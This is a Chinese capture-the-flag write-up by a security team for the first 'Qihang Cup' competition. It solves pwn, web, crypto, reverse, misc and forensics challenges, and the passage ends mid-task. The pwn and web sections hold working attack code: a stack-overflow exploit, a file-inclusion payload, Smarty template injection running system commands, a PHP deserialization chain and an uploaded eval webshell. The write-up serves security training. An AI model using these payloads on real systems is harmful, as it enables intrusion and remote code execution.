---
title: 第一届“启航杯”网络安全挑战赛 writeup by Min-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511945&idx=1&sn=580bb1cb37ff1172adbb54fe8c4a4f08&chksm=e89d8751dfea0e478593b8745da4f6356e498490410874dd9837a0c05d15891b833f7b69d1d1&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2025-02-11
fetch_date: 2025-10-06T20:39:02.138524
---

# 第一届“启航杯”网络安全挑战赛 writeup by Min-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2Sb6qsSuXgA3RMQNzLzTxp0kNTp5gqKMmkQ3LJ2ZB2hN3XHPuCxtNKdBg/0?wx_fmt=jpeg)

# 第一届“启航杯”网络安全挑战赛 writeup by Min-Venom

原创

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## Pwn

### Easy\_Pwn

直接打栈溢出就好

```
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

io=remote("154.64.245.108",33285)

payload=b'a'*(0x50+8)+p64(0x00000000004012B1)+p64(0x00000000004011C6)

io.sendlineafter("Enter your banking information:\n",payload)
io.interactive()
```

## Web

### Easy\_include

文件包含，用data协议就行

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

### Web\_IP

smarty模板注入，payload：

```
X-Forwarded-For: {system('cat /flag')}
```

### ez\_pop

new\_start的题目完全没改，就是注意在Sec里面要同时给obj和var分别执行Easy和eeee，这样调用了Easy里\_\_call方法，同时完成了调用eeee里的\_\_clone方法的要求。

```
Start::__destruct()->Sec::__toString()->Easy::__call->eeee::__clone()->Start::__isset()->Sec::__invoke()
```

exp:

```
 <?php
error_reporting(0);
highlight_file(__FILE__);
class Start{
    public $name;
    public $func;

}

class Sec{
    public $obj;
    public $var;

}

class Easy{
    public $cla;

}

class eeee{
    public $obj;

}

$a=new Start;
$b=new Sec;
$c=new Easy;
$d=new eeee;
$e=new Sec;
$f=new Start;
$a->name=$b;
$b->obj=$c;
$b->var=$d;
$d->obj=$f;
$f->func=$e;
echo serialize($a);
```

### PCREMagic

```
import requests
from io import BytesIO

files = {
    'file': BytesIO(b'<?php eval($_POST[tou]);//' + b'a' * 1000000)
}

res = requests.post('http://challenge.qihangcup.cn:33619/', files=files, allow_redirects=False)
print(res.headers)
```

PCRE绕一下就好，禁了一些函数，连蚁剑就行

## Crypto:

### RSA

私钥直接解RSA即可

```
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

private_key = b"""-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDGuAwF2+/sPCQ0vnfG+5pF/9ED3Qy+izkGC7KyEdy8/tTTBHGn
NebZc0kPMNDJmHxFey8p+BkefRv5Bct8IhSrNx5H7uXocJGFTlScfQDIr39Qj/K6
AvvEii5qiqpjWI1RY4nUGHS+ciirsUfcCXxcNtchjVWhs490ezkt19GtjwIDAQAB
AoGABNrAKHB8BvhdJhC1Gl5RIX6jW4XN5uW9yeEFR4ZaLx/GkTUdlakib5N6aG2X
3CTmfEgLGepeqrkBsu6qTukCOjWD4dPJyXRGqiC8MEE2D4IB/iujcZs2QnMB4tvZ
zjp/FD7TP/onTkENzEqJBpG4+uPcS+uUHyh9v3y5qnwZWsECQQDdWmZV9XOioTQN
lhcLr5dCCogGDHBFwG78Krx2TiB1KvbCKt9C5TnZZNw2NmKYbiLlvFt448UeO91T
RuMfTGGhAkEA5dKyesekmsBxVDOR2ddk54oudDb/mcFidsZ1rUdNO8J+yHec0x3s
eWqH8739ZkEiURMiM8dKVi5WUiK1QHYhLwJBAIwhW6HVZqQxK3Pibap/OeGcKyqx
Gy59OYW4RGEc6p1iWp7nZznBRhMjL+m+GkLnjn4j9UCd6T9PpLjAqq44u6ECQGn0
/RJ8TtiGFvnSGNFNbBkP7SDpZmh17zaBgymTcPk3T4qPEv+GkUrdIbbvhg+Jwg+M
+bzTieM309ZkaBpDHEMCQQC4fl6XCOwp53J/JTXiV1+HRIIMkaAtuZDey7M5CeAT
ds/5pvMgAyFyclIvvvvlrQjB20zMyfc4na8bu0NOJVg7
-----END RSA PRIVATE KEY-----"""

enmessage = "wOEgF62CT0a2Bnjpx/LCfOTBvnMhz0UxG2zYFZkxKqR7li2Vkixtu4+iLkscNXR+rzaUi1UtlBipduZmuO1c9xr6FZfrMwy9yblFmy1SzhVYjFLDTsKcuTOUnghOcLyMuEAHz9I46QD0Y9kAeomSicOyC6oY5wbJvYw3E4xet28="

def decrypt_message(encrypted_message, private_key):
    key = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(key)
    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))
    return decrypted_message.decode()

decrypted_message = decrypt_message(enmessage, private_key)
print("解密后的消息:")
print(decrypted_message)
```

QHCTF{627a2a02-1160-475a-a8c8-91f072639c8a}

## Reverse

### checker

就异或，没啥好说的

```
a = [0x72, 0x6B, 0x60, 0x77, 0x65, 0x58, 0x46, 0x46, 0x15, 0x40, 0x14, 0x41, 0x1A, 0x40, 0x0E, 0x46, 0x14, 0x45, 0x16, 0x0E, 0x17, 0x45, 0x42, 0x41, 0x0E, 0x1A, 0x41, 0x47, 0x45, 0x0E, 0x46, 0x42, 0x13, 0x14, 0x46, 0x13, 0x10, 0x17, 0x45, 0x15, 0x42, 0x16, 0x5E]

for i in range(len(a)):
    print(chr(a[i]^0x23),end='')
```

### rainbow

依然是异或

```
data=[0x0B,0x12,0x19,0x0E,0x1C,0x21,0x3B,0x62,0x68,0x68,0x6C,0x6B,0x6A,0x69,0x77,0x6F,0x3B,0x63,0x3B,0x77,0x6E,0x3C,0x3B,0x6D,0x77,0x3B,0x38,0x39,0x3C,0x77,0x3E,0x3F,0x3B,0x6E,0x69,0x62,0x3B,0x6D,0x39,0x3F,0x6D,0x62,0x27]

for i in range(len(data)):
    print(chr(data[i]^90),end='')
```

### 小明的note

直接动调走解密就好

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbwrrU1lY7vMtpTz8fQwgMIAEWiawoJSfT9jEqVpdya3d5KzoZqxic6zRA/640?wx_fmt=png&from=appmsg)

## Misc

### 请找出拍摄地所在位置

先由这个定位到柳州市柳城县

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2Sb2BPtrniaugL9ZxA8OQDMYyKqvbOBpNvS7RNkPn0OiaINfLa5QfUy1sTQ/640?wx_fmt=png&from=appmsg)

然后街口什么烧烤，直接搜

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbY05fh3ng2tjFr6zSWZicUu5TraPsAx47Qs8ceqMKyOwCG4ojqdqxk3w/640?wx_fmt=png&from=appmsg)

直接就定位过去了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbKP8YsNHwK2cd1D2nqfkQV97DQQn5jup2v0EpeTz94qmD3ZfrazfqAg/640?wx_fmt=png&from=appmsg)

### \_\_\_\_\_\_启动！

追踪一下tcp流，第135个流发现可疑流量

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbaSPicN770nUyoLPTNOGHxTF3ibicdAKIZkF6gd1rkicIia0k64Aur6gNbXg/640?wx_fmt=png&from=appmsg)

丢给豆包解密获得flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbicumBY3uWn8OCmlpicvqlw13TbUv5V6F4xFfV1vFnM6fA0ibQnicyGqwiaQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbbefILHcbicbVdnjicMBJRt1iak1P9m4aj5IJpVMWUo1H0LuS9dEDnfpQQ/640?wx_fmt=png&from=appmsg)

QHCTF{69b62b46-de2f-4ac2-81f7-234613d25cfb}

### QHCTF For Year 2025

参考https://blog.csdn.net/qq\_42016346/article/details/104234416

得到

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbVd9Ls2gC7KW7lW3I4oBRX8b49RDzW0d854ITdvwFAuSLh8NvPuYx0Q/640?wx_fmt=png&from=appmsg)

于是flag为QHCTF{FUN}

### PvzHE

flag在PvzHEimagesZombieNote1.png

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbZUjpmy52ddL2usXV080iaiabiaNjPxicOwqS3CXey4ZCGnia1ibok2S33Elg/640?wx_fmt=png&from=appmsg)

### 你能看懂这串未知的文字吗

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2Sbx2LG89tCS6kvKpqs4UWEjTnFdH9piaxzPAzDkWl5bol26XEQwEEbCMA/640?wx_fmt=png&from=appmsg)

对照表：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbzlveCxAVVNozj1iagVPp7dwWpyvKGRyBEXDhzGoia9rOVFG8S8tFmonw/640?wx_fmt=png&from=appmsg)

得到密文：szfpguwizgwesqzoaoerv!!!

密码为：qihangbeiiseasy

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbjH3DbrkLbMs0oISz2zxnU5jODvnAO5lsgL9eicDXQU8yTmfueG7fYMA/640?wx_fmt=png&from=appmsg)

维吉尼亚密码解密即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbXT6dRDg4sxAN8nYCv4NCTN4ricwj1B2CscTvpmMXRicWWnsIh9wEHmvg/640?wx_fmt=png&from=appmsg)

QHCTF{cryptoveryeasybysheep!!!}

### 猿类的编程语言你了解吗

jphs隐写，然后BrainFuck解码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbqDpq7lfHs3Uq3WEkibJX4kPrzFiaicxK2gmpvVjePIWozN0gAKicibkts7Q/640?wx_fmt=png&from=appmsg)

随波逐流得到flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbZMtXIrdHVia3ibBGKFPHEpmvd9Wmv5o5RwW75BxhReThKZUhDP9hAjPg/640?wx_fmt=png&from=appmsg)

## forensics

### Win\_01

某天，小明正在某网站进行学习。突然，一位蛤客盯上了他，并向他发送了一封钓鱼邮件。由于小明刚接触网络安全，对钓鱼邮件并不熟悉，他不小心下载并点击了邮件中的附件。当他后来学习到钓鱼邮件的相关知识时，已经为时晚矣。于是，他请求你帮助找出蛤客的痕迹。请你针对附件镜像进行一次应急响应，查找以下flag值。压缩包附件的解压密码为：90382728-ca22-48e7-8413-61f6438f1b90。请以QHCTF{xxxxxxxx}的格式提交结果。

1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}

在后门用户的启动项中找到server2.exe，放入虚拟机隔离环境，直接运行。用System Informer去看外联IP

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbenpjXu2FHr71hzmVQYJBfDesL1mLTAPxIET1ptXrUoPk2onic3ibH7CA/640?wx_fmt=jpeg&from=appmsg)

QHCTF{ad4fdee2eada36ec3c20e9d6311cf258}

### Win\_02

利用AXIOM先扫描一下整个磁盘镜像，在密码和令牌中发现NTLM哈希

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2Sb8pvdNJSx50gicHicPVdJLU4B13A0FfNibAlMKRtrLicBkueY7eVzoCAMDA/640?wx_fmt=jpeg&from=appmsg)

chamd5解一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBS5bh5RTz0aHc3ewzxBI2SbRzFLpv4MLD5upQ49l5U9EzRGRI1bcqqKQibhzHsJmAsgNd4QfFwqa0w/640?wx_fmt=png&from=appmsg)

HackY$\_123456

QHCTF{d6106666c424cf9dd0f455273dff2111}

### Win\_04

4.蛤客在系统数据库中藏了一些东西，请...